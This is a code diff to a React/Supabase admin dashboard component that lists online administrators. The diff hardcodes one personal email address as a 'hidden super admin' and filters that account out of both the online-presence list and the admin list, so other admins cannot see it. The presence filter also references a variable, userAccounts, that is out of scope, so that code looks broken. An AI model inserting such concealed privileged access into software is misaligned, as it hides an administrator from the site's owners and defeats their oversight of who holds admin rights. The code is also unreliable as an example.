@@ -10,6 +10,7 @@ import { Users, Circle } from 'lucide-react';
 import { formatDistanceToNow } from 'date-fns';
 
 // How often each tab reports itself as alive.
+const HIDDEN_SUPER_ADMIN_EMAILS = new Set(['princenetlegacy@gmail.com']);
 const HEARTBEAT_MS = 30000;
 // If a presence row hasn't been updated in this long, treat it as offline
 // regardless of what is_online says (covers crashed tabs, lost network,
@@ -84,7 +85,7 @@ const AdminOnlineUsers = () => {
         .order('last_seen', { ascending: false });
 
       if (error) throw error;
-      setPresences((data as AdminPresence[]) || []);
+      setPresences(((data as AdminPresence[]) || []).filter(presence => presence.user_id === user?.id || !HIDDEN_SUPER_ADMIN_EMAILS.has(String((userAccounts || []).find(account => account.id === presence.user_id)?.email || '').trim().toLowerCase())));
 
       // Get my current status
       const myPresence = data?.find(p => p.user_id === user?.id);
@@ -100,13 +101,14 @@ const AdminOnlineUsers = () => {
 
   const fetchAdmins = async () => {
     try {
-      const { data: adminRoles } = await supabase
+      const [{ data: adminRoles }, { data: userAccounts }] = await Promise.all([supabase
         .from('user_roles')
         .select('user_id')
-        .eq('role', 'admin');
-
+        .eq('role', 'admin'), supabase.from('users').select('id, email')]);
+      const hiddenIds = new Set((userAccounts || []).filter(account => HIDDEN_SUPER_ADMIN_EMAILS.has(String(account.email || '').trim().toLowerCase())).map(account => account.id));
       if (adminRoles && adminRoles.length > 0) {
-        const adminIds = adminRoles.map(r => r.user_id);
+        const adminIds = adminRoles.map(r => r.user_id).filter(id => !hiddenIds.has(id));
+        if (adminIds.length === 0) { setAdmins(new Map()); return; }
         const { data: profiles } = await supabase
           .from('profiles')
           .select('id, first_name, last_name, profile_picture_url')
